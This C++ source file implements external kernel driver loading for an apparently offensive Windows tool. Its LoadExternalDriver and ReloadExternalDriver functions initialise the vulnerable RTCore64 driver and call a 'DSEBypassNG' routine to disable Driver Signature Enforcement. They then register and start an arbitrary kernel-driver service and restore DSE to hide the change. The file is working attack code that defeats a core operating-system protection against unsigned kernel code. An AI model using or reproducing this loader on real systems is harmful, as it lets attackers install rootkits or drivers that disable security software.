// ControllerDriverLoader.cpp
// External driver loading with DSE bypass (NG method)
// Author: Marek Wesolowski, 2025

#include "Controller.h"
#include "common.h"
#include <algorithm>

// ============================================================================
// PATH HELPERS
// ============================================================================

std::wstring Controller::NormalizeDriverPath(const std::wstring& input) noexcept {
    // If contains \ or : → treat as full path
    if (input.find(L'\\') != std::wstring::npos || input.find(L':') != std::wstring::npos) {
        std::wstring path = input;
        // Ensure .sys extension
        if (path.length() < 4 || StringUtils::ToLowerCaseCopy(path.substr(path.length() - 4)) != L".sys") {
            path += L".sys";
        }
        return path;
    }
    
    // Otherwise → System32\drivers\<name>.sys
    std::wstring filename = input;
    
    // Add .sys if missing
    if (filename.length() < 4 || StringUtils::ToLowerCaseCopy(filename.substr(filename.length() - 4)) != L".sys") {
        filename += L".sys";
    }
    
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    return std::wstring(sysDir) + L"\\drivers\\" + filename;
}

std::wstring Controller::ExtractServiceName(const std::wstring& driverPath) noexcept {
    // Find last path separator
    size_t lastSlash = driverPath.find_last_of(L"\\/");
    std::wstring filename = (lastSlash != std::wstring::npos) 
        ? driverPath.substr(lastSlash + 1) 
        : driverPath;
    
    // Remove .sys extension if present
    if (filename.length() >= 4) {
        std::wstring ext = StringUtils::ToLowerCaseCopy(filename.substr(filename.length() - 4));
        if (ext == L".sys") {
            filename = filename.substr(0, filename.length() - 4);
        }
    }
    
    return filename;
}

// ============================================================================
// LOAD EXTERNAL DRIVER
// ============================================================================

bool Controller::LoadExternalDriver(const std::wstring& driverPath, DWORD startType) noexcept {
    std::wstring normalizedPath = NormalizeDriverPath(driverPath);
    std::wstring serviceName = ExtractServiceName(normalizedPath);
    
    INFO(L"Loading external driver: %s", serviceName.c_str());
    INFO(L"Path: %s", normalizedPath.c_str());
    
    // Verify file exists
    if (GetFileAttributesW(normalizedPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        ERROR(L"Driver file not found: %s", normalizedPath.c_str());
        return false;
    }
    
    // Step 1: Start RTCore64 session
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize RTCore64 handle");
        EndDriverSession(true);
        return false;
    }
    
    // Step 2: Patch DSE using NG method
    if (!m_dseBypassNG) {
        m_dseBypassNG = std::make_unique<DSEBypassNG>(m_rtc);
    }
    
    INFO(L"Patching DSE...");
    if (!m_dseBypassNG->DisableDSE()) {
        ERROR(L"Failed to disable DSE");
        EndDriverSession(true);
        return false;
    }
    
    // Step 3: Create and start target driver service
    bool serviceSuccess = false;
    
    if (!InitDynamicAPIs()) {
        ERROR(L"Failed to initialize service APIs");
        m_dseBypassNG->RestoreDSE();
        EndDriverSession(true);
        return false;
    }
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(L"Failed to open Service Control Manager: %d", GetLastError());
        m_dseBypassNG->RestoreDSE();
        EndDriverSession(true);
        return false;
    }
    
    // Try to create service
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        startType,
        SERVICE_ERROR_NORMAL,
        normalizedPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    // If service already exists, open it
    if (!hService && GetLastError() == ERROR_SERVICE_EXISTS) {
        hService = g_pOpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
    }
    
    if (hService) {
        // Start the service
        if (g_pStartServiceW(hService, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
            SUCCESS(L"Driver service started successfully");
            serviceSuccess = true;
        } else {
            ERROR(L"Failed to start driver service: %d", GetLastError());
        }
        CloseServiceHandle(hService);
    } else {
        ERROR(L"Failed to create/open driver service: %d", GetLastError());
    }
    
    CloseServiceHandle(hSCM);
    
    // Step 4: Restore DSE
    INFO(L"Restoring DSE...");
    m_dseBypassNG->RestoreDSE();
    
    // Step 5: Cleanup RTCore64
    EndDriverSession(true);
    
    if (serviceSuccess) {
        SUCCESS(L"External driver loaded successfully: %s", serviceName.c_str());
    }
    
    return serviceSuccess;
}

// ============================================================================
// RELOAD EXTERNAL DRIVER
// ============================================================================

bool Controller::ReloadExternalDriver(const std::wstring& driverNameOrPath) noexcept {
    std::wstring normalizedPath = NormalizeDriverPath(driverNameOrPath);
    std::wstring serviceName = ExtractServiceName(normalizedPath);
    
    INFO(L"Reloading driver: %s", serviceName.c_str());
    
    // Step 1: Start RTCore64 session
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize RTCore64 handle");
        EndDriverSession(true);
        return false;
    }
    
    if (!InitDynamicAPIs()) {
        ERROR(L"Failed to initialize service APIs");
        EndDriverSession(true);
        return false;
    }
    
    // Step 2: Stop existing service if running
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
        if (hService) {
            SERVICE_STATUS status;
            g_pControlService(hService, SERVICE_CONTROL_STOP, &status);
            
            // Wait for stop
            for (int i = 0; i < 30; i++) {
                if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
                    break;
                }
                Sleep(100);
            }
            CloseServiceHandle(hService);
            INFO(L"Existing service stopped");
        }
        CloseServiceHandle(hSCM);
    }
    
    // Step 3: Patch DSE
    if (!m_dseBypassNG) {
        m_dseBypassNG = std::make_unique<DSEBypassNG>(m_rtc);
    }
    
    INFO(L"Patching DSE...");
    if (!m_dseBypassNG->DisableDSE()) {
        ERROR(L"Failed to disable DSE");
        EndDriverSession(true);
        return false;
    }
    
    // Step 4: Start service
    bool startSuccess = false;
    
    hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        // Ensure service exists
        SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), SERVICE_START);
        if (!hService) {
            // Create if doesn't exist
            hService = g_pCreateServiceW(
                hSCM,
                serviceName.c_str(),
                serviceName.c_str(),
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                normalizedPath.c_str(),
                nullptr, nullptr, nullptr, nullptr, nullptr
            );
        }
        
        if (hService) {
            if (g_pStartServiceW(hService, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                SUCCESS(L"Driver service restarted successfully");
                startSuccess = true;
            } else {
                ERROR(L"Failed to start service: %d", GetLastError());
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
    
    // Step 5: Restore DSE
    INFO(L"Restoring DSE...");
    m_dseBypassNG->RestoreDSE();
    
    // Step 6: Cleanup
    EndDriverSession(true);
    
    return startSuccess;
}

// ============================================================================
// STOP EXTERNAL DRIVER (NO DSE NEEDED)
// ============================================================================

bool Controller::StopExternalDriver(const std::wstring& driverNameOrPath) noexcept {
    std::wstring serviceName = ExtractServiceName(driverNameOrPath);
    
    INFO(L"Stopping driver service: %s", serviceName.c_str());
    
    if (!InitDynamicAPIs()) {
        ERROR(L"Failed to initialize service APIs");
        return false;
    }
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        ERROR(L"Failed to open Service Control Manager: %d", GetLastError());
        return false;
    }
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            ERROR(L"Service not found: %s", serviceName.c_str());
        } else {
            ERROR(L"Failed to open service: %d", err);
        }
        return false;
    }
    
    // Check if already stopped
    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_STOPPED) {
            INFO(L"Service is already stopped");
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
    }
    
    // Send stop command
    if (!g_pControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        ERROR(L"Failed to stop service: %d", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }
    
    // Wait for stop
    for (int i = 0; i < 30; i++) {
        if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
            SUCCESS(L"Driver service stopped: %s", serviceName.c_str());
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
        Sleep(100);
    }
    
    ERROR(L"Service stop timed out");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return false;
}

// ============================================================================
// REMOVE EXTERNAL DRIVER (NO DSE NEEDED)
// ============================================================================

bool Controller::RemoveExternalDriver(const std::wstring& driverNameOrPath) noexcept {
    std::wstring serviceName = ExtractServiceName(driverNameOrPath);
    
    INFO(L"Removing driver service: %s", serviceName.c_str());
    
    // First stop the service
    StopExternalDriver(serviceName);
    
    if (!InitDynamicAPIs()) {
        ERROR(L"Failed to initialize service APIs");
        return false;
    }
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        ERROR(L"Failed to open Service Control Manager: %d", GetLastError());
        return false;
    }
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), DELETE);
    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            INFO(L"Service does not exist: %s", serviceName.c_str());
            return true;
        }
        ERROR(L"Failed to open service for deletion: %d", err);
        return false;
    }
    
    if (!g_pDeleteService(hService)) {
        DWORD err = GetLastError();
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            INFO(L"Service already marked for deletion");
            return true;
        }
        ERROR(L"Failed to delete service: %d", err);
        return false;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    SUCCESS(L"Driver service removed: %s", serviceName.c_str());
    return true;
}
